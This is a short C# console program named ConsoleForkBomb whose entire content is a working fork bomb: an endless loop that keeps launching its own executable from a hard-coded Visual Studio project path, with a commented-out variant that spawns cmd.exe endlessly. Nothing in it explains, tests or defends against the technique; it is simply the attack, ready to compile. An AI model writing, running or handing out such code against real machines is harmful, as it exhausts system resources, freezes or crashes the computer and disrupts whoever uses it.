using System.Diagnostics;

namespace ConsoleForkBomb
{
	class Program
	{
		static void Main(string[] args)
		{
			//while(true){Process.Start(@"C:\WINDOWS\system32\cmd.exe");}
			while(true){Process.Start(@"C:\Users\Fox\Documents\Visual Studio 2019\Projects\ConsoleForkBomb\bin\Debug\ConsoleForkBomb.exe");}
			
		}
	}
}